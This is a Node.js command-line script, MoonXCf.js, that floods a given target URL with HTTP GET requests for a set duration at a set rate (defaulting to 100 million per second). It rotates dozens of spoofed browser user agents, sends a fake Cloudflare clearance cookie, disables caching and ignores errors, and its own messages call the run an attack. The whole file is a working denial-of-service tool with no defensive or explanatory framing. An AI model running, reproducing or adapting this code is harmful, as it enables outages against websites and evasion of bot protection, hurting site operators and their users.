const axios = require('axios');

const target = process.argv[2];
const duration = parseInt(process.argv[3]) || 120; 
const rps = parseInt(process.argv[4]) || 100000000;

if (!target) {
    console.log("Usage: node MoonXCf.js <target> <time> <rps>");
    process.exit(0);
}

const userAgents = [
"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/116.0.0.0 Safari/537.36",
"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:116.0) Gecko/20100101 Firefox/116.0",
"Mozilla/5.0 (Macintosh; Intel Mac OS X 13_6) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.6 Safari/605.1.15",
"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 Chrome/115.0.0.0 Safari/537.36",
"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Edge/116.0",
"Mozilla/5.0 (iPhone; CPU iPhone OS 16_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.6 Mobile/15E148 Safari/604.1",
"Mozilla/5.0 (iPad; CPU OS 16_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.6 Mobile/15E148 Safari/604.1",
"Mozilla/5.0 (Linux; Android 13; SM-G991B) AppleWebKit/537.36 Chrome/116.0.5845.121 Mobile Safari/537.36",
"Mozilla/5.0 (Linux; Android 12; Pixel 6) AppleWebKit/537.36 Chrome/115.0 Mobile Safari/537.36",
"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/114.0.0.0 Safari/537.36",
"Mozilla/5.0 (Macintosh; Intel Mac OS X 12_6_8) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.5 Safari/605.1.15",
"Mozilla/5.0 (Linux; Android 11; SM-A505F) AppleWebKit/537.36 Chrome/113.0 Mobile Safari/537.36",
"Mozilla/5.0 (iPhone; CPU iPhone OS 15_7_8 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.7 Mobile/15E148 Safari/604.1",
"Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 Chrome/112.0.0.0 Safari/537.36",
"Mozilla/5.0 (Macintosh; Intel Mac OS X 11_7_9) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.6 Safari/605.1.15",
"Mozilla/5.0 (Linux; Android 10; SM-N970F) AppleWebKit/537.36 Chrome/111.0 Mobile Safari/537.36",
"Mozilla/5.0 (iPad; CPU OS 14_8_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1 Mobile/15E148 Safari/604.1",
"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:111.0) Gecko/20100101 Firefox/111.0",
"Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:110.0) Gecko/20100101 Firefox/110.0",
"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1.2 Safari/605.1.15",
"Mozilla/5.0 (Linux; Android 9; Pixel 3) AppleWebKit/537.36 Chrome/108.0 Mobile Safari/537.36",
"Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 Chrome/107.0.0.0 Safari/537.36",
"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_6) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.1.2 Safari/605.1.15",
"Mozilla/5.0 (Linux; Android 8.0; SM-G950F) AppleWebKit/537.36 Chrome/106.0 Mobile Safari/537.36",
"Mozilla/5.0 (iPhone; CPU iPhone OS 13_7 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.1 Mobile/15E148 Safari/604.1",
"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/105.0.0.0 Safari/537.36",
"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_6) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.1 Safari/605.1.15",
"Mozilla/5.0 (Linux; Android 7.0; SM-G930F) AppleWebKit/537.36 Chrome/104.0 Mobile Safari/537.36",
"Mozilla/5.0 (iPad; CPU OS 12_5_5 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.1 Mobile/15E148 Safari/604.1",
"Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 Chrome/103.0.0.0 Safari/537.36",
"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_6) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/11.1 Safari/605.1.15",
"Mozilla/5.0 (Linux; Android 6.0; Nexus 5X) AppleWebKit/537.36 Chrome/102.0 Mobile Safari/537.36",
"Mozilla/5.0 (iPhone; CPU iPhone OS 12_4_9 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.4 Mobile/15E148 Safari/604.1",
"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Edge/102.0",
"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_6) AppleWebKit/537.36 Chrome/101.0 Safari/537.36",
"Mozilla/5.0 (Linux; Android 5.1; Nexus 6) AppleWebKit/537.36 Chrome/100.0 Mobile Safari/537.36",
"Mozilla/5.0 (iPad; CPU OS 11_4_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/11.0 Mobile/15E148 Safari/604.1",
"Mozilla/5.0 (Windows NT 6.3; Win64; x64) AppleWebKit/537.36 Chrome/99.0 Safari/537.36",
"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_5) AppleWebKit/537.36 Chrome/98.0 Safari/537.36",
"Mozilla/5.0 (Linux; Android 4.4; Nexus 7) AppleWebKit/537.36 Chrome/97.0 Mobile Safari/537.36",
"Mozilla/5.0 (iPhone; CPU iPhone OS 11_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/11.0 Mobile/15A372 Safari/604.1",
"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 Chrome/96.0 Safari/537.36",
"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_5) AppleWebKit/537.36 Chrome/95.0 Safari/537.36",
"Mozilla/5.0 (Linux; Android 4.4; SM-G900F) AppleWebKit/537.36 Chrome/94.0 Mobile Safari/537.36",
"Mozilla/5.0 (iPad; CPU OS 10_3_3 like Mac OS X) AppleWebKit/603.3.8 (KHTML, like Gecko) Version/10.0 Mobile/14G60 Safari/602.1",
"Mozilla/5.0 (Windows NT 6.2; Win64; x64) AppleWebKit/537.36 Chrome/93.0 Safari/537.36",
"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_8_5) AppleWebKit/537.36 Chrome/92.0 Safari/537.36",
"Mozilla/5.0 (Linux; Android 4.2.2; Nexus 4) AppleWebKit/537.36 Chrome/91.0 Mobile Safari/537.36",
"Mozilla/5.0 (iPhone; CPU iPhone OS 10_3_4 like Mac OS X) AppleWebKit/603.1.30 (KHTML, like Gecko) Version/10.0 Mobile/14G61 Safari/602.1",
"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 Chrome/90.0 Safari/537.36",
"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_7_5) AppleWebKit/534.57.2 Chrome/90.0 Safari/534.57.2"
];

const dummyCookie = "cf_clearance=abc123; sessionid=xyz456;";

let totalRequests = 0;
const endTime = Date.now() + duration * 1000;

console.log(`Starting MoonXCf`);

async function sendRequest() {
    try {
        const headers = {
            'User-Agent': userAgents[Math.floor(Math.random() * userAgents.length)],
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
            'Accept-Language': 'en-US,en;q=0.9',
            'Cache-Control': 'no-cache',
            'Pragma': 'no-cache',
            'Upgrade-Insecure-Requests': '1',
            'Cookie': dummyCookie
        };

        await axios.get(target, { headers, timeout: 5000 });
        totalRequests++;
        if (totalRequests % 50 === 0) {
            console.log(`${totalRequests} requests sent...`);
        }
    } catch (err) {
        
    }
}

function startAttack() {
    const interval = setInterval(() => {
        if (Date.now() > endTime) {
            clearInterval(interval);
            console.log(`Attack finished. Total requests sent: ${totalRequests}`);
            process.exit(0);
        }
        for (let i = 0; i < rps; i++) {
            sendRequest();
        }
    }, 1000);
}

startAttack();
